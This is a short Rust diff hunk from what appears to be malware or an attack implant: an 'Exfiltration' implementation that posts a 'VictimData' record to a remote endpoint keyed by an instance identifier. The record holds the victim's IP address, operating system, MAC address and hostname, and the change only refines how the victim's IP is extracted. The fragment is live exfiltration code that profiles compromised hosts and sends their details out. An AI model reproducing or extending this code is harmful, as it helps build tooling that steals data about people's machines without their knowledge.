@@ -80,7 +80,10 @@ impl Exfiltration {
                 state.0.instance_identifier
             ))
             .json(&VictimData {
-                address: remote_address.0.to_string(),
+                address: match remote_address.0.as_socket_addr() {
+                    Some(socket) => socket.ip().to_string(),
+                    None => "Unknown".into(),
+                },
                 operating_system: data.0.operating_system,
                 mac_address: data.0.mac_address,
                 hostname: data.0.hostname,
